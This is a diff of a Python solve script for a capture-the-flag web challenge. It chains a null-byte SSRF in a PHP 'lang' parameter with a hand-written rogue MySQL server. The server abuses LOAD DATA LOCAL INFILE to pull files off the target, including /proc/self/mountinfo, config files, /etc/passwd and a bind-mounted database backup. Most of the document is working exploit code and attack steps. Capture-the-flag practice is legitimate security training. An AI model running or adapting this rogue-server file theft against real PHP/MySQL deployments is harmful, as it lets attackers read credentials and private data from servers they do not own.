@@ -1,41 +1,38 @@
 #!/usr/bin/env python3
-"""Medofans (Avito CTF 2026) -- SSRF -> rogue-MySQL -> LOAD DATA LOCAL INFILE.
+"""Medofans (Avito CTF 2026) -- SSRF -> rogue-MySQL -> LOAD DATA LOCAL INFILE -> flag.
 
 How the solution was reached (same logic as the write-up, condensed):
 
-  * ``/api/content.php?lang=<L>`` builds a DB host ``<L>.db.internal`` and a
-    schema ``hbf_<L>``, then ``mysqli_connect``s. The flag lives only in the
-    German locale as a fact whose body is server-side redacted to
-    ``/*REDACTED*/``, so it can never be read through the normal response.
-  * The prior analysis declared the host uncontrollable because every attempt
-    kept the ``.db.internal`` suffix in the error message. That reading was
-    wrong: PHP builds ``"<lang>.db.internal"`` as a binary-safe string, but the
-    C ``getaddrinfo`` under it stops at the FIRST NUL byte. So
-    ``lang=<HOST>%00`` makes the app actually resolve+connect to ``<HOST>``
-    while the JSON error still cosmetically prints ``<HOST>\\x00.db.internal``.
-    Proof: ``127.0.0.1%00`` -> "Connection refused" (real dial to :3306),
-    ``8.8.8.8%00`` -> "Connection timed out" -- NOT "getaddrinfo failed".
-  * That is a full SSRF to any ``host:3306`` (the port is fixed at 3306 -- a
-    ``:port`` suffix is split off and dropped). We stand up a rogue MySQL
-    server: complete the handshake, then answer the app's first ``COM_QUERY``
-    with a ``LOCAL INFILE`` request (0xFB + path). A mysqli client with
-    ``local_infile`` enabled uploads that local file to us -- bypassing the
-    ``/*REDACTED*/`` app-layer redaction, since the bytes arrive on our socket
-    rather than through the app's (redacted) HTTP output.
+  * ``/api/content.php?lang=<L>`` builds a DB host ``<L>.db.internal`` by string
+    concatenation. PHP strings are binary-safe but the underlying C
+    ``getaddrinfo`` stops at the first NUL byte, so ``lang=<HOST>%00`` makes the
+    app resolve+connect to ``<HOST>:3306`` (the ``.db.internal`` suffix survives
+    only in the error text). Proof: ``127.0.0.1%00`` -> "Connection refused",
+    ``8.8.8.8%00`` -> "Connection timed out" (NOT "getaddrinfo failed"). Full
+    SSRF to any ``host:3306`` (port fixed: a ``:`` in lang triggers an unrelated
+    colon-split that drops the port).
+  * We stand up a rogue MySQL: complete the handshake advertising
+    ``CLIENT_LOCAL_FILES`` and answer the first ``COM_QUERY`` with a LOCAL INFILE
+    request (``0xFB`` + path). A mysqli client with ``local_infile`` on uploads
+    that local file of the WEB container to us (read as www-data).
+  * The flag is NOT in the webroot/env (``/proc/self/environ`` is root-only:
+    the worker dropped root->www-data so dumpable=0). It sits in a Docker
+    bind-mounted backup at a non-guessable path. We discover the path by reading
+    ``/proc/self/mountinfo`` (world-readable, not dumpable-gated), which lists
+    every bind-mount incl. single files, then read the mount
+    (``/opt/backups/hbf_de_backup_2019-05-05.sql`` -- a mysqldump whose German
+    fact #5 body carries the un-redacted flag).
 
-DELIVERY REQUIREMENT (read this):
-  The app dials OUT to ``<CONNECT_BACK>:3306``. ``CONNECT_BACK`` must therefore
-  be a host/IP that is *publicly reachable by the challenge server on TCP/3306*
-  and on which this script's rogue server is listening. A NAT'd laptop or a
-  Claude sandbox cannot receive that inbound connection (verified: the sandbox
-  egress IP actively refuses inbound :3306). Run this from a VPS with a public
-  IP and 3306 open, passing ``--connect-back <public-ip>``.
+DELIVERY REQUIREMENT: the app dials OUT to ``<CONNECT_BACK>:3306``, so
+``CONNECT_BACK`` must be a host/IP publicly reachable by the challenge on
+TCP/3306 with this rogue listening. Run from a VPS with a public IP and 3306
+open (free tunnels don't give a fixed :3306: bore.pub's 3306 was taken, serveo
+refuses anonymous raw-TCP forwards).
 
-Dependencies: stdlib + ``requests`` (both ty-checkable). The MySQL wire framing
-is hand-rolled -- no driver needed.
+Dependencies: stdlib + ``requests``. The MySQL wire framing is hand-rolled.
 
 Usage:
-    python3 solve_medofans.py \\
+    uv run python medofans/solve_medofans.py \\
         --target https://hbfuns-9vqogw6q.avitoctf.ru \\
         --connect-back <YOUR_PUBLIC_IP>
 """
@@ -51,24 +48,12 @@ from dataclasses import dataclass, field
 
 import requests
 
-# Files worth reading, most-likely-first. content.php reveals where the flag
-# comes from (DB row vs file vs env) and the DB creds; environ often carries a
-# FLAG/secret; the rest are common flag drop locations.
-DEFAULT_FILES: tuple[str, ...] = (
-    "/proc/self/environ",
-    "/var/www/html/api/content.php",
-    "/var/www/html/content.php",
-    "/var/www/html/api/config.php",
-    "/var/www/html/config.php",
-    "/flag",
-    "/flag.txt",
-    "/app/flag.txt",
-    "/etc/passwd",
-)
+# Mount points that are standard container plumbing, never the flag.
+_BORING_MOUNTS = frozenset({"/", "/etc/hosts", "/etc/hostname", "/etc/resolv.conf"})
+_BORING_PREFIXES = ("/proc", "/sys", "/dev")
 
 # Greeting capability flags. CLIENT_LOCAL_FILES must be advertised so the client
-# will honour our LOCAL INFILE request; the client still needs its own
-# local_infile enabled to actually stream the file.
+# honours our LOCAL INFILE request; the client still needs its own local_infile.
 _CAP_LOW = 0xF7FF
 _CAP_HIGH = 0xF781
 
@@ -78,9 +63,9 @@ _FLAG_RE = re.compile(rb"avito\{[^}]*\}")
 
 @dataclass
 class Capture:
-    """Shared state: the path currently being requested and the bytes read."""
+    """Shared state: the path currently requested and the bytes read back."""
 
-    target_path: str = "/etc/passwd"
+    target_path: str = "/proc/self/mountinfo"
     data: bytes = b""
     got_file: bool = False
     event: threading.Event = field(default_factory=threading.Event)
@@ -138,7 +123,7 @@ def _greeting() -> bytes:
 def _handle_connection(conn: socket.socket, cap: Capture) -> None:
     """Drive one client through handshake and a LOCAL INFILE file read."""
     try:
-        conn.settimeout(10)
+        conn.settimeout(15)
         conn.sendall(_greeting())
         _read_packet(conn)  # client login/auth -- ignored, we accept everyone
         conn.sendall(_packet(_OK, 2))
@@ -180,39 +165,83 @@ def _serve(listener: socket.socket, cap: Capture, stop: threading.Event) -> None
         _handle_connection(conn, cap)
 
 
-def trigger(target: str, connect_back: str, timeout: float = 15.0) -> str:
+def _trigger(target: str, connect_back: str, timeout: float = 15.0) -> None:
     """Fire the null-byte SSRF so the app dials our rogue server.
 
     Args:
         target: Base URL of the challenge (trailing slash optional).
         connect_back: Host/IP the app should connect to (our rogue server).
         timeout: Per-request timeout in seconds.
-
-    Returns:
-        The raw response body from the app (useful for debugging).
     """
     url = f"{target.rstrip('/')}/api/content.php"
     # lang = "<host>\x00" -> host resolves via truncated getaddrinfo, port 3306.
     try:
-        resp = requests.get(url, params={"lang": f"{connect_back}\x00"}, timeout=timeout)
-        return resp.text
-    except requests.RequestException as exc:
-        return f"<request error: {exc}>"
+        requests.get(url, params={"lang": f"{connect_back}\x00"}, timeout=timeout)
+    except requests.RequestException:
+        pass
 
 
-def exfiltrate(
-    target: str, connect_back: str, files: tuple[str, ...], bind_port: int = 3306
-) -> dict[str, bytes]:
-    """Read each candidate file off the web server via LOAD DATA LOCAL INFILE.
+def read_file(target: str, connect_back: str, cap: Capture, path: str) -> bytes:
+    """Read one absolute path off the web container via LOAD DATA LOCAL INFILE.
 
     Args:
         target: Challenge base URL.
-        connect_back: Public host/IP the app connects back to (our server).
-        files: Absolute paths to attempt, in priority order.
+        connect_back: Public host/IP the app connects back to (our rogue).
+        cap: Shared capture state (the serve thread reads ``cap.target_path``).
+        path: Absolute path to fetch.
+
+    Returns:
+        The file bytes (empty if missing / unreadable by www-data / empty file).
+    """
+    cap.target_path = path
+    cap.data = b""
+    cap.got_file = False
+    cap.event.clear()
+    _trigger(target, connect_back)
+    cap.event.wait(timeout=14)
+    return cap.data
+
+
+def parse_bind_mounts(mountinfo: bytes) -> list[str]:
+    """Extract interesting bind-mount targets (single files) from mountinfo.
+
+    Args:
+        mountinfo: Raw bytes of ``/proc/self/mountinfo``.
+
+    Returns:
+        Mount points that are not standard container plumbing -- e.g. a
+        ``-v ./flag:/opt/backups/x.sql`` single-file bind-mount.
+    """
+    out: list[str] = []
+    for line in mountinfo.decode("utf-8", "replace").splitlines():
+        fields = line.split(" ")
+        # A real mountinfo record starts with "<mount_id> <parent_id> ..." and has
+        # a " - " separator; this guard skips any non-mountinfo noise.
+        if (
+            len(fields) < 5
+            or not (fields[0].isdigit() and fields[1].isdigit())
+            or "-" not in fields
+        ):
+            continue
+        mount_point = fields[4]
+        if mount_point in _BORING_MOUNTS:
+            continue
+        if any(mount_point == p or mount_point.startswith(p + "/") for p in _BORING_PREFIXES):
+            continue
+        out.append(mount_point)
+    return out
+
+
+def solve(target: str, connect_back: str, bind_port: int = 3306) -> str | None:
+    """Run the full chain: rogue up -> mountinfo -> read bind-mounts -> flag.
+
+    Args:
+        target: Challenge base URL.
+        connect_back: Public host/IP the challenge reaches on TCP/3306 (us).
         bind_port: Local port to listen on (must be 3306 to match the app).
 
     Returns:
-        Mapping of file path -> bytes read (empty if nothing came back).
+        The flag string, or None if not found.
     """
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -225,59 +254,48 @@ def exfiltrate(
     server = threading.Thread(target=_serve, args=(listener, cap, stop), daemon=True)
     server.start()
 
-    results: dict[str, bytes] = {}
     try:
-        for path in files:
-            cap.target_path = path
-            cap.data = b""
-            cap.got_file = False
-            cap.event.clear()
+        print("[*] reading /proc/self/mountinfo to discover bind-mounts ...", flush=True)
+        mountinfo = read_file(target, connect_back, cap, "/proc/self/mountinfo")
+        if not mountinfo:
+            print("[-] mountinfo empty -- is the rogue reachable on :3306?", flush=True)
+            return None
+        candidates = parse_bind_mounts(mountinfo)
+        print(f"[+] bind-mount candidates: {candidates}", flush=True)
+
+        for path in candidates:
             print(f"[*] reading {path} ...", flush=True)
-            trigger(target, connect_back)
-            cap.event.wait(timeout=12)
-            results[path] = cap.data
-            if cap.got_file:
-                preview = cap.data[:400].decode("utf-8", "replace")
-                print(f"[+] {len(cap.data)} bytes:\n{preview}\n", flush=True)
-                match = _FLAG_RE.search(cap.data)
-                if match:
-                    print(f"[!!] FLAG: {match.group().decode()}", flush=True)
-                    break
-            else:
-                print("[-] nothing returned (local_infile off, or path missing)", flush=True)
+            blob = read_file(target, connect_back, cap, path)
+            match = _FLAG_RE.search(blob)
+            if match:
+                flag = match.group().decode()
+                print(f"[!!] FLAG: {flag}", flush=True)
+                return flag
+            preview = blob[:120].decode("utf-8", "replace").replace("\n", " ")
+            print(f"    ({len(blob)} bytes) {preview}", flush=True)
     finally:
         stop.set()
         listener.close()
-    return results
+    return None
 
 
 def main() -> None:
-    """Parse args and run the exfiltration loop."""
+    """Parse args and run the solve."""
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--target", default="https://hbfuns-9vqogw6q.avitoctf.ru")
     parser.add_argument(
         "--connect-back",
         required=True,
-        help="Public host/IP the challenge server can reach on TCP/3306 (this server).",
+        help="Public host/IP the challenge can reach on TCP/3306 (this rogue server).",
     )
     parser.add_argument("--port", type=int, default=3306, help="Local listen port (keep 3306).")
-    parser.add_argument(
-        "--file",
-        action="append",
-        dest="files",
-        help="Override target file(s); repeatable. Defaults to a built-in list.",
-    )
     args = parser.parse_args()
 
-    files = tuple(args.files) if args.files else DEFAULT_FILES
-    results = exfiltrate(args.target, args.connect_back, files, bind_port=args.port)
-
-    for path, blob in results.items():
-        match = _FLAG_RE.search(blob)
-        if match:
-            print(f"\n=== FLAG in {path}: {match.group().decode()} ===")
-            return
-    print("\n[!] No avito{...} found in read files; inspect content.php output above.")
+    flag = solve(args.target, args.connect_back, bind_port=args.port)
+    if flag:
+        print(f"\n=== FLAG: {flag} ===")
+    else:
+        print("\n[!] flag not found; inspect the bind-mount candidates above.")
 
 
 if __name__ == "__main__":
